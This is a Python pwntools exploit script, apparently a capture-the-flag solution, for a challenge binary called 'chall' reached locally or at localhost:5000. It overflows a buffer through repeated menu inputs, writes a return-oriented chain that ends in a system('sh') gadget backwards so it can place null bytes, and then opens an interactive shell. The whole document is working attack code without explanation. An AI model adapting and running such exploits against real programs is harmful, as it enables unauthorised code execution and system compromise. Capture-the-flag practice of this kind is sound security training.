from pwn import *

elf = context.binary = ELF("chall")
libc = elf.libc
if args.REMOTE:
	p = remote("localhost", 5000)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

def add(buf):
    sla(b"choice: ", b"1")
    sla(b"add: ", buf)

def reset():
    sla(b"choice: ", b"2")

def pl(buf):
    for i in range(0xf):
        add(b"A"*255)
    add(b"A"*250)
    add(buf)
    reset()

pop_rbp = 0x40125d
sh = next(elf.search(b"sh\x00")) + 0x1000
system_gadget = 0x40162a
"""
   0x000000000040162a <+731>:	lea    rax,[rbp-0x1000]
   0x0000000000401631 <+738>:	mov    rdi,rax
   0x0000000000401634 <+741>:	call   0x401110 <system@plt>
"""

payload = [pop_rbp, sh, system_gadget]
# we need to write backwards so we can write NULL bytes
pl(b"A"*16 + p64(system_gadget))

for i in range(4):
    pl(b"A"*(15-i))
pl(b"A"*8 + p64(sh))

for i in range(4):
    pl(b"A"*(7-i))
pl(p64(pop_rbp))

sla(b"choice: ", b"4")

p.interactive()
